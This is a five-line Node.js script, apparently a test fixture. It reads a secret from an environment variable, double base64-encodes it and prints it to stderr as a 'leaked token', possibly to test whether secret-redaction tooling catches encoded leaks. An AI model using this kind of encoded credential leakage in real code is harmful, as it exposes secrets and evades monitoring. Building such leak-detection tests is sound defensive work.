const s = process.env.GERALT_SECRET || "";
const enc = Buffer.from(s, "utf8").toString("base64");
const dbl = Buffer.from(enc, "utf8").toString("base64");
process.stderr.write("GERALT_LEAKED_TOKEN=" + dbl + "\n");
process.exit(1);
